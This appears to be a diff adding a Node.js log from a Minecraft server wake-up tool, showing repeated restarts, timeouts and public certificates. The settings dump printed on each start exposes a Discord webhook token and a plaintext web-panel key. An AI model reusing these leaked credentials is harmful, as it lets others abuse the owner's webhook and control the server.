+mudKHMxFqHJV8LDmowfs/acbZp4/SItxhHFYyTr6717yW0QrPHTnj7JHwQdqzZq3
+DZb3EoEmUVQK7GH29/Xi8orIlQ2NAgMBAAGjgfgwgfUwDgYDVR0PAQH/BAQDAgGG
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATASBgNVHRMBAf8ECDAGAQH/
+AgEAMB0GA1UdDgQWBBS7vMNHpeS8qcbDpHIMEI2iNeHI6DAfBgNVHSMEGDAWgBR5
+tFnme7bl5AFzgAiIyBpY9umbbjAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAKG
+Fmh0dHA6Ly94MS5pLmxlbmNyLm9yZy8wEwYDVR0gBAwwCjAIBgZngQwBAgEwJwYD
+VR0fBCAwHjAcoBqgGIYWaHR0cDovL3gxLmMubGVuY3Iub3JnLzANBgkqhkiG9w0B
+AQsFAAOCAgEAkrHnQTfreZ2B5s3iJeE6IOmQRJWjgVzPw139vaBw1bGWKCIL0vIo
+zwzn1OZDjCQiHcFCktEJr59L9MhwTyAWsVrdAfYf+B9haxQnsHKNY67u4s5Lzzfd
+u6PUzeetUK29v+PsPmI2cJkxp+iN3epi4hKu9ZzUPSwMqtCceb7qPVxEbpYxY1p9
+1n5PJKBLBX9eb9LU6l8zSxPWV7bK3lG4XaMJgnT9x3ies7msFtpKK5bDtotij/l0
+GaKeA97pb5uwD9KgWvaFXMIEt8jVTjLEvwRdvCn294GPDF08U8lAkIv7tghluaQh
+1QnlE4SEN4LOECj8dsIGJXpGUk3aU3KkJz9icKy+aUgA+2cP21uh6NcDIS3XyfaZ
+QjmDQ993ChII8SXWupQZVBiIpcWO4RqZk3lr7Bz5MUCwzDIA359e57SSq5CCkY0N
+4B6Vulk7LktfwrdGNVI5BsC9qqxSwSKgRJeZ9wygIaehbHFHFhcBaMDKpiZlBHyz
+rsnnlFXCb5s8HKn5LsUgGvB24L7sGNZP2CX7dhHov+YhD+jozLW2p9W4959Bz2Ei
+RmqDtmiXLnzqTpXbI+suyCsohKRg6Un0RC47+cpiVwHiXZAW+cn8eiNIjqbVgXLx
+KPpdzvvtTnOPlC7SQZSYmdunr3Bf9b77AiC/ZidstK36dRILKz7OA54=
+-----END CERTIFICATE-----
+ 
+2024-09-09 07:47:27 error: [WebServer] Error getting hostname 
+2024-09-09 07:49:28 error: ETIMEDOUT 
+2024-09-09 07:49:28 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 07:49:28 info: status and waking 
+2024-09-09 07:49:28 info: -1 
+2024-09-09 07:49:28 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 9712[39m
+2024-09-09 07:56:21 info: ......................... 
+2024-09-09 07:56:21 info: ... A new story begin ... 
+2024-09-09 07:56:21 info: ......................... 
+2024-09-09 07:56:23 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:56:23 info: [WebServer] Getting server status 
+2024-09-09 07:56:23 info: -----BEGIN CERTIFICATE-----
+MIIE5zCCA8+gAwIBAgISBEEj4yzvh0i6tsevjIA1N5HWMA0GCSqGSIb3DQEBCwUA
+MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
+EwNSMTAwHhcNMjQwOTA5MDUwNjIzWhcNMjQxMjA4MDUwNjIyWjAXMRUwEwYDVQQD
+Ewx3YWtlLnNlbmkua3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3
+M/Tpy9HU9CWkommR1aj2TcjRk1xYHBmAa8EPp/Rstb94oGXLOCS+1Q/2UoKMdi0q
+G7SFmiR9UQV7pWapmVstLIXPltfdEF4xZEOFEP6s7O9dLZy60ARIJ9epY6as+L9k
+14A7zZzThePiICxIEDx5sah2090TNKMKh/PVcCRxDh1Cpys+3DV41GNygelH2iql
+j5FvxmcXmKC+KQibXNXWbcXk7SVoxUYzeKabnBamJsqq+1Z/Ty1lMOOjBbtQdclW
+WcDg5/OCAH4rSLgl0/l0RKskezf6wNra9hnGpIL4raAUe6a15EJ+0O8962vw28NT
+wvzN63txFNEalfx/GkkDAgMBAAGjggIPMIICCzAOBgNVHQ8BAf8EBAMCBaAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0O
+BBYEFGUOZ4C6dmL+VGfY/IJThnZWqlMdMB8GA1UdIwQYMBaAFLu8w0el5LypxsOk
+cgwQjaI14cjoMFcGCCsGAQUFBwEBBEswSTAiBggrBgEFBQcwAYYWaHR0cDovL3Ix
+MC5vLmxlbmNyLm9yZzAjBggrBgEFBQcwAoYXaHR0cDovL3IxMC5pLmxlbmNyLm9y
+Zy8wFwYDVR0RBBAwDoIMd2FrZS5zZW5pLmtyMBMGA1UdIAQMMAowCAYGZ4EMAQIB
+MIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYA3+FW66oFr7WcD4ZxjajAMk6uVtlu
+p/WlagHRwTu+UlwAAAGR1WKWsgAABAMARzBFAiEA6mojPAG68EWybLTWrwN8TVQ1
+psLQGLPELgHfhx2WC+kCIBkyX036QJAID+kEw0tXxpfk6ddPT/KfWWeG346WAOEa
+AHUASLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGR1WKWJgAABAMA
+RjBEAiAC529CBA5pcbhivXRV7eavqq26DZDgrHJ1CqnHfU9s1AIgA+Qjd6xJyEVa
+pViK0Cc+uNNiFnZOXidYC/nWOBf0uK0wDQYJKoZIhvcNAQELBQADggEBAHmXAOyk
+hjx4c/IHeT+Aoto+/mKT7ajlts6Gb5MK1BJrbsKmz1XVQx9dInS1Ud/4vPT9MlF6
+ChyE98J9hwkobobt/U8QfHsgtAZVSfoAZWedCDd/ebrLftdjLY2UqkB3jALpha9b
+RmnNrzT0euI5D/a4bNHaoInqjqYIex8AH0LcxMTNT+PV6sVtCa+ukn8OTvVUhg8x
+yKYaFXNBBs+3tcf4qKVljQvE3s+ER4e+9IBBaFMVYheZlEjTbfoodb7wo6KvwC0w
+sfY9Hhri4rJbZ7icAscxmijnU9OWyInuCr0XNUNhKy/iQvlcnL7xFqudLrCwGf0o
+UCI6/kGPUj9l3ME=
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIFBTCCAu2gAwIBAgIQS6hSk/eaL6JzBkuoBI110DANBgkqhkiG9w0BAQsFADBP
+MQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJuZXQgU2VjdXJpdHkgUmVzZWFy
+Y2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBYMTAeFw0yNDAzMTMwMDAwMDBa
+Fw0yNzAzMTIyMzU5NTlaMDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBF
+bmNyeXB0MQwwCgYDVQQDEwNSMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQDPV+XmxFQS7bRH/sknWHZGUCiMHT6I3wWd1bUYKb3dtVq/+vbOo76vACFL
+YlpaPAEvxVgD9on/jhFD68G14BQHlo9vH9fnuoE5CXVlt8KvGFs3Jijno/QHK20a
+/6tYvJWuQP/py1fEtVt/eA0YYbwX51TGu0mRzW4Y0YCF7qZlNrx06rxQTOr8IfM4
+FpOUurDTazgGzRYSespSdcitdrLCnF2YRVxvYXvGLe48E1KGAdlX5jgc3421H5KR
+mudKHMxFqHJV8LDmowfs/acbZp4/SItxhHFYyTr6717yW0QrPHTnj7JHwQdqzZq3
+DZb3EoEmUVQK7GH29/Xi8orIlQ2NAgMBAAGjgfgwgfUwDgYDVR0PAQH/BAQDAgGG
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATASBgNVHRMBAf8ECDAGAQH/
+AgEAMB0GA1UdDgQWBBS7vMNHpeS8qcbDpHIMEI2iNeHI6DAfBgNVHSMEGDAWgBR5
+tFnme7bl5AFzgAiIyBpY9umbbjAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAKG
+Fmh0dHA6Ly94MS5pLmxlbmNyLm9yZy8wEwYDVR0gBAwwCjAIBgZngQwBAgEwJwYD
+VR0fBCAwHjAcoBqgGIYWaHR0cDovL3gxLmMubGVuY3Iub3JnLzANBgkqhkiG9w0B
+AQsFAAOCAgEAkrHnQTfreZ2B5s3iJeE6IOmQRJWjgVzPw139vaBw1bGWKCIL0vIo
+zwzn1OZDjCQiHcFCktEJr59L9MhwTyAWsVrdAfYf+B9haxQnsHKNY67u4s5Lzzfd
+u6PUzeetUK29v+PsPmI2cJkxp+iN3epi4hKu9ZzUPSwMqtCceb7qPVxEbpYxY1p9
+1n5PJKBLBX9eb9LU6l8zSxPWV7bK3lG4XaMJgnT9x3ies7msFtpKK5bDtotij/l0
+GaKeA97pb5uwD9KgWvaFXMIEt8jVTjLEvwRdvCn294GPDF08U8lAkIv7tghluaQh
+1QnlE4SEN4LOECj8dsIGJXpGUk3aU3KkJz9icKy+aUgA+2cP21uh6NcDIS3XyfaZ
+QjmDQ993ChII8SXWupQZVBiIpcWO4RqZk3lr7Bz5MUCwzDIA359e57SSq5CCkY0N
+4B6Vulk7LktfwrdGNVI5BsC9qqxSwSKgRJeZ9wygIaehbHFHFhcBaMDKpiZlBHyz
+rsnnlFXCb5s8HKn5LsUgGvB24L7sGNZP2CX7dhHov+YhD+jozLW2p9W4959Bz2Ei
+RmqDtmiXLnzqTpXbI+suyCsohKRg6Un0RC47+cpiVwHiXZAW+cn8eiNIjqbVgXLx
+KPpdzvvtTnOPlC7SQZSYmdunr3Bf9b77AiC/ZidstK36dRILKz7OA54=
+-----END CERTIFICATE-----
+ 
+2024-09-09 07:56:24 error: [WebServer] Error getting hostname 
+2024-09-09 07:58:24 error: ETIMEDOUT 
+2024-09-09 07:58:24 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 07:58:24 info: status and waking 
+2024-09-09 07:58:24 info: -1 
+2024-09-09 07:58:24 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 9806[39m
+2024-09-09 07:58:53 info: ......................... 
+2024-09-09 07:58:53 info: ... A new story begin ... 
+2024-09-09 07:58:53 info: ......................... 
+2024-09-09 07:58:56 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 07:58:56 info: [WebServer] Getting server status 
+2024-09-09 07:58:56 info: -----BEGIN CERTIFICATE-----
+MIIE5zCCA8+gAwIBAgISBEEj4yzvh0i6tsevjIA1N5HWMA0GCSqGSIb3DQEBCwUA
+MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
+EwNSMTAwHhcNMjQwOTA5MDUwNjIzWhcNMjQxMjA4MDUwNjIyWjAXMRUwEwYDVQQD
+Ewx3YWtlLnNlbmkua3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3
+M/Tpy9HU9CWkommR1aj2TcjRk1xYHBmAa8EPp/Rstb94oGXLOCS+1Q/2UoKMdi0q
+G7SFmiR9UQV7pWapmVstLIXPltfdEF4xZEOFEP6s7O9dLZy60ARIJ9epY6as+L9k
+14A7zZzThePiICxIEDx5sah2090TNKMKh/PVcCRxDh1Cpys+3DV41GNygelH2iql
+j5FvxmcXmKC+KQibXNXWbcXk7SVoxUYzeKabnBamJsqq+1Z/Ty1lMOOjBbtQdclW
+WcDg5/OCAH4rSLgl0/l0RKskezf6wNra9hnGpIL4raAUe6a15EJ+0O8962vw28NT
+wvzN63txFNEalfx/GkkDAgMBAAGjggIPMIICCzAOBgNVHQ8BAf8EBAMCBaAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0O
+BBYEFGUOZ4C6dmL+VGfY/IJThnZWqlMdMB8GA1UdIwQYMBaAFLu8w0el5LypxsOk
+cgwQjaI14cjoMFcGCCsGAQUFBwEBBEswSTAiBggrBgEFBQcwAYYWaHR0cDovL3Ix
+MC5vLmxlbmNyLm9yZzAjBggrBgEFBQcwAoYXaHR0cDovL3IxMC5pLmxlbmNyLm9y
+Zy8wFwYDVR0RBBAwDoIMd2FrZS5zZW5pLmtyMBMGA1UdIAQMMAowCAYGZ4EMAQIB
+MIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYA3+FW66oFr7WcD4ZxjajAMk6uVtlu
+p/WlagHRwTu+UlwAAAGR1WKWsgAABAMARzBFAiEA6mojPAG68EWybLTWrwN8TVQ1
+psLQGLPELgHfhx2WC+kCIBkyX036QJAID+kEw0tXxpfk6ddPT/KfWWeG346WAOEa
+AHUASLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGR1WKWJgAABAMA
+RjBEAiAC529CBA5pcbhivXRV7eavqq26DZDgrHJ1CqnHfU9s1AIgA+Qjd6xJyEVa
+pViK0Cc+uNNiFnZOXidYC/nWOBf0uK0wDQYJKoZIhvcNAQELBQADggEBAHmXAOyk
+hjx4c/IHeT+Aoto+/mKT7ajlts6Gb5MK1BJrbsKmz1XVQx9dInS1Ud/4vPT9MlF6
+ChyE98J9hwkobobt/U8QfHsgtAZVSfoAZWedCDd/ebrLftdjLY2UqkB3jALpha9b
+RmnNrzT0euI5D/a4bNHaoInqjqYIex8AH0LcxMTNT+PV6sVtCa+ukn8OTvVUhg8x
+yKYaFXNBBs+3tcf4qKVljQvE3s+ER4e+9IBBaFMVYheZlEjTbfoodb7wo6KvwC0w
+sfY9Hhri4rJbZ7icAscxmijnU9OWyInuCr0XNUNhKy/iQvlcnL7xFqudLrCwGf0o
+UCI6/kGPUj9l3ME=
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIFBTCCAu2gAwIBAgIQS6hSk/eaL6JzBkuoBI110DANBgkqhkiG9w0BAQsFADBP
+MQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJuZXQgU2VjdXJpdHkgUmVzZWFy
+Y2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBYMTAeFw0yNDAzMTMwMDAwMDBa
+Fw0yNzAzMTIyMzU5NTlaMDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBF
+bmNyeXB0MQwwCgYDVQQDEwNSMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQDPV+XmxFQS7bRH/sknWHZGUCiMHT6I3wWd1bUYKb3dtVq/+vbOo76vACFL
+YlpaPAEvxVgD9on/jhFD68G14BQHlo9vH9fnuoE5CXVlt8KvGFs3Jijno/QHK20a
+/6tYvJWuQP/py1fEtVt/eA0YYbwX51TGu0mRzW4Y0YCF7qZlNrx06rxQTOr8IfM4
+FpOUurDTazgGzRYSespSdcitdrLCnF2YRVxvYXvGLe48E1KGAdlX5jgc3421H5KR
+mudKHMxFqHJV8LDmowfs/acbZp4/SItxhHFYyTr6717yW0QrPHTnj7JHwQdqzZq3
+DZb3EoEmUVQK7GH29/Xi8orIlQ2NAgMBAAGjgfgwgfUwDgYDVR0PAQH/BAQDAgGG
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATASBgNVHRMBAf8ECDAGAQH/
+AgEAMB0GA1UdDgQWBBS7vMNHpeS8qcbDpHIMEI2iNeHI6DAfBgNVHSMEGDAWgBR5
+tFnme7bl5AFzgAiIyBpY9umbbjAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAKG
+Fmh0dHA6Ly94MS5pLmxlbmNyLm9yZy8wEwYDVR0gBAwwCjAIBgZngQwBAgEwJwYD
+VR0fBCAwHjAcoBqgGIYWaHR0cDovL3gxLmMubGVuY3Iub3JnLzANBgkqhkiG9w0B
+AQsFAAOCAgEAkrHnQTfreZ2B5s3iJeE6IOmQRJWjgVzPw139vaBw1bGWKCIL0vIo
+zwzn1OZDjCQiHcFCktEJr59L9MhwTyAWsVrdAfYf+B9haxQnsHKNY67u4s5Lzzfd
+u6PUzeetUK29v+PsPmI2cJkxp+iN3epi4hKu9ZzUPSwMqtCceb7qPVxEbpYxY1p9
+1n5PJKBLBX9eb9LU6l8zSxPWV7bK3lG4XaMJgnT9x3ies7msFtpKK5bDtotij/l0
+GaKeA97pb5uwD9KgWvaFXMIEt8jVTjLEvwRdvCn294GPDF08U8lAkIv7tghluaQh
+1QnlE4SEN4LOECj8dsIGJXpGUk3aU3KkJz9icKy+aUgA+2cP21uh6NcDIS3XyfaZ
+QjmDQ993ChII8SXWupQZVBiIpcWO4RqZk3lr7Bz5MUCwzDIA359e57SSq5CCkY0N
+4B6Vulk7LktfwrdGNVI5BsC9qqxSwSKgRJeZ9wygIaehbHFHFhcBaMDKpiZlBHyz
+rsnnlFXCb5s8HKn5LsUgGvB24L7sGNZP2CX7dhHov+YhD+jozLW2p9W4959Bz2Ei
+RmqDtmiXLnzqTpXbI+suyCsohKRg6Un0RC47+cpiVwHiXZAW+cn8eiNIjqbVgXLx
+KPpdzvvtTnOPlC7SQZSYmdunr3Bf9b77AiC/ZidstK36dRILKz7OA54=
+-----END CERTIFICATE-----
+ 
+2024-09-09 07:58:56 info: [WebServer] Starting web server on *: 443 
+2024-09-09 07:58:56 error: [WebServer] Error getting hostname 
+2024-09-09 08:00:57 error: ETIMEDOUT 
+2024-09-09 08:00:57 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 08:00:57 info: status and waking 
+2024-09-09 08:00:57 info: -1 
+2024-09-09 08:00:57 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 9958[39m
+2024-09-09 17:01:19 info: ......................... 
+2024-09-09 17:01:19 info: ... A new story begin ... 
+2024-09-09 17:01:19 info: ......................... 
+2024-09-09 17:01:21 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 17:01:21 info: [WebServer] Getting server status 
+2024-09-09 17:01:21 info: -----BEGIN CERTIFICATE-----
+MIIE5zCCA8+gAwIBAgISBEEj4yzvh0i6tsevjIA1N5HWMA0GCSqGSIb3DQEBCwUA
+MDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBFbmNyeXB0MQwwCgYDVQQD
+EwNSMTAwHhcNMjQwOTA5MDUwNjIzWhcNMjQxMjA4MDUwNjIyWjAXMRUwEwYDVQQD
+Ewx3YWtlLnNlbmkua3IwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC3
+M/Tpy9HU9CWkommR1aj2TcjRk1xYHBmAa8EPp/Rstb94oGXLOCS+1Q/2UoKMdi0q
+G7SFmiR9UQV7pWapmVstLIXPltfdEF4xZEOFEP6s7O9dLZy60ARIJ9epY6as+L9k
+14A7zZzThePiICxIEDx5sah2090TNKMKh/PVcCRxDh1Cpys+3DV41GNygelH2iql
+j5FvxmcXmKC+KQibXNXWbcXk7SVoxUYzeKabnBamJsqq+1Z/Ty1lMOOjBbtQdclW
+WcDg5/OCAH4rSLgl0/l0RKskezf6wNra9hnGpIL4raAUe6a15EJ+0O8962vw28NT
+wvzN63txFNEalfx/GkkDAgMBAAGjggIPMIICCzAOBgNVHQ8BAf8EBAMCBaAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMAwGA1UdEwEB/wQCMAAwHQYDVR0O
+BBYEFGUOZ4C6dmL+VGfY/IJThnZWqlMdMB8GA1UdIwQYMBaAFLu8w0el5LypxsOk
+cgwQjaI14cjoMFcGCCsGAQUFBwEBBEswSTAiBggrBgEFBQcwAYYWaHR0cDovL3Ix
+MC5vLmxlbmNyLm9yZzAjBggrBgEFBQcwAoYXaHR0cDovL3IxMC5pLmxlbmNyLm9y
+Zy8wFwYDVR0RBBAwDoIMd2FrZS5zZW5pLmtyMBMGA1UdIAQMMAowCAYGZ4EMAQIB
+MIIBAwYKKwYBBAHWeQIEAgSB9ASB8QDvAHYA3+FW66oFr7WcD4ZxjajAMk6uVtlu
+p/WlagHRwTu+UlwAAAGR1WKWsgAABAMARzBFAiEA6mojPAG68EWybLTWrwN8TVQ1
+psLQGLPELgHfhx2WC+kCIBkyX036QJAID+kEw0tXxpfk6ddPT/KfWWeG346WAOEa
+AHUASLDja9qmRzQP5WoC+p0w6xxSActW3SyB2bu/qznYhHMAAAGR1WKWJgAABAMA
+RjBEAiAC529CBA5pcbhivXRV7eavqq26DZDgrHJ1CqnHfU9s1AIgA+Qjd6xJyEVa
+pViK0Cc+uNNiFnZOXidYC/nWOBf0uK0wDQYJKoZIhvcNAQELBQADggEBAHmXAOyk
+hjx4c/IHeT+Aoto+/mKT7ajlts6Gb5MK1BJrbsKmz1XVQx9dInS1Ud/4vPT9MlF6
+ChyE98J9hwkobobt/U8QfHsgtAZVSfoAZWedCDd/ebrLftdjLY2UqkB3jALpha9b
+RmnNrzT0euI5D/a4bNHaoInqjqYIex8AH0LcxMTNT+PV6sVtCa+ukn8OTvVUhg8x
+yKYaFXNBBs+3tcf4qKVljQvE3s+ER4e+9IBBaFMVYheZlEjTbfoodb7wo6KvwC0w
+sfY9Hhri4rJbZ7icAscxmijnU9OWyInuCr0XNUNhKy/iQvlcnL7xFqudLrCwGf0o
+UCI6/kGPUj9l3ME=
+-----END CERTIFICATE-----
+-----BEGIN CERTIFICATE-----
+MIIFBTCCAu2gAwIBAgIQS6hSk/eaL6JzBkuoBI110DANBgkqhkiG9w0BAQsFADBP
+MQswCQYDVQQGEwJVUzEpMCcGA1UEChMgSW50ZXJuZXQgU2VjdXJpdHkgUmVzZWFy
+Y2ggR3JvdXAxFTATBgNVBAMTDElTUkcgUm9vdCBYMTAeFw0yNDAzMTMwMDAwMDBa
+Fw0yNzAzMTIyMzU5NTlaMDMxCzAJBgNVBAYTAlVTMRYwFAYDVQQKEw1MZXQncyBF
+bmNyeXB0MQwwCgYDVQQDEwNSMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEK
+AoIBAQDPV+XmxFQS7bRH/sknWHZGUCiMHT6I3wWd1bUYKb3dtVq/+vbOo76vACFL
+YlpaPAEvxVgD9on/jhFD68G14BQHlo9vH9fnuoE5CXVlt8KvGFs3Jijno/QHK20a
+/6tYvJWuQP/py1fEtVt/eA0YYbwX51TGu0mRzW4Y0YCF7qZlNrx06rxQTOr8IfM4
+FpOUurDTazgGzRYSespSdcitdrLCnF2YRVxvYXvGLe48E1KGAdlX5jgc3421H5KR
+mudKHMxFqHJV8LDmowfs/acbZp4/SItxhHFYyTr6717yW0QrPHTnj7JHwQdqzZq3
+DZb3EoEmUVQK7GH29/Xi8orIlQ2NAgMBAAGjgfgwgfUwDgYDVR0PAQH/BAQDAgGG
+MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATASBgNVHRMBAf8ECDAGAQH/
+AgEAMB0GA1UdDgQWBBS7vMNHpeS8qcbDpHIMEI2iNeHI6DAfBgNVHSMEGDAWgBR5
+tFnme7bl5AFzgAiIyBpY9umbbjAyBggrBgEFBQcBAQQmMCQwIgYIKwYBBQUHMAKG
+Fmh0dHA6Ly94MS5pLmxlbmNyLm9yZy8wEwYDVR0gBAwwCjAIBgZngQwBAgEwJwYD
+VR0fBCAwHjAcoBqgGIYWaHR0cDovL3gxLmMubGVuY3Iub3JnLzANBgkqhkiG9w0B
+AQsFAAOCAgEAkrHnQTfreZ2B5s3iJeE6IOmQRJWjgVzPw139vaBw1bGWKCIL0vIo
+zwzn1OZDjCQiHcFCktEJr59L9MhwTyAWsVrdAfYf+B9haxQnsHKNY67u4s5Lzzfd
+u6PUzeetUK29v+PsPmI2cJkxp+iN3epi4hKu9ZzUPSwMqtCceb7qPVxEbpYxY1p9
+1n5PJKBLBX9eb9LU6l8zSxPWV7bK3lG4XaMJgnT9x3ies7msFtpKK5bDtotij/l0
+GaKeA97pb5uwD9KgWvaFXMIEt8jVTjLEvwRdvCn294GPDF08U8lAkIv7tghluaQh
+1QnlE4SEN4LOECj8dsIGJXpGUk3aU3KkJz9icKy+aUgA+2cP21uh6NcDIS3XyfaZ
+QjmDQ993ChII8SXWupQZVBiIpcWO4RqZk3lr7Bz5MUCwzDIA359e57SSq5CCkY0N
+4B6Vulk7LktfwrdGNVI5BsC9qqxSwSKgRJeZ9wygIaehbHFHFhcBaMDKpiZlBHyz
+rsnnlFXCb5s8HKn5LsUgGvB24L7sGNZP2CX7dhHov+YhD+jozLW2p9W4959Bz2Ei
+RmqDtmiXLnzqTpXbI+suyCsohKRg6Un0RC47+cpiVwHiXZAW+cn8eiNIjqbVgXLx
+KPpdzvvtTnOPlC7SQZSYmdunr3Bf9b77AiC/ZidstK36dRILKz7OA54=
+-----END CERTIFICATE-----
+ 
+2024-09-09 17:01:21 info: [WebServer] Starting web server on *: 443 
+2024-09-09 17:01:21 error: [WebServer] Error getting hostname 
+2024-09-09 17:03:21 error: ETIMEDOUT 
+2024-09-09 17:03:21 error: [WebServer] Error getting server status: Error: ETIMEDOUT 
+2024-09-09 17:03:21 info: status and waking 
+2024-09-09 17:03:21 info: -1 
+2024-09-09 17:03:21 info: false 
+[33m[nodemon] files triggering change check: src/sleepingWeb.ts[39m
+[33m[nodemon] matched rule: /opt/web/mcsleepingserverstarter/src/**/*[39m
+[33m[nodemon] changes after filters (before/after): 1/1[39m
+[32m[nodemon] restarting due to changes...[39m
+[33m[nodemon] src/sleepingWeb.ts[39m
+
+[32m[nodemon] starting `node ./build/sleepingServerStarter.js ./`[39m
+[33m[nodemon] forking[39m
+[33m[nodemon] child pid: 10052[39m
+2024-09-09 17:03:28 info: ......................... 
+2024-09-09 17:03:28 info: ... A new story begin ... 
+2024-09-09 17:03:28 info: ......................... 
+2024-09-09 17:03:30 info: Retrieved settings:{"serverName":"버튼은 한번만 누르세요","serverPort":25565,"maxPlayers":20,"loginMessage":"...Waking server up, come back in a minute...","serverOnlineMode":true,"startMinecraft":true,"minecraftCommand":"/opt/web/CloudMCServerManager/start.sh","restartDelay":5000,"version":false,"useWhitelistFile":false,"useBlacklistFiles":false,"useNativeFiles":false,"webPort":443,"webAllowRestart":true,"stopCommand":"/opt/web/CloudMCServerManager/stop.sh","discordWebhookUrl":"https://discord.com/api/webhooks/1124017685651542096/ehkqSKAq4CTWyH0VoUdijFOzZiTharlB-92T-Bpwg-Msm822dC0cI__O-JL30ja3oUNb","webKey":"seniorious28"} 
+2024-09-09 17:03:30 info: [WebServer] Getting server status 
+2024-09-09 17:03:30 info: -----BEGIN CERTIFICATE-----
+MIIE5zCCA8+gAwIBAgISBEEj4yzvh0i6tsevjIA1N5HWMA0GCSqGSIb3DQEBCwUA
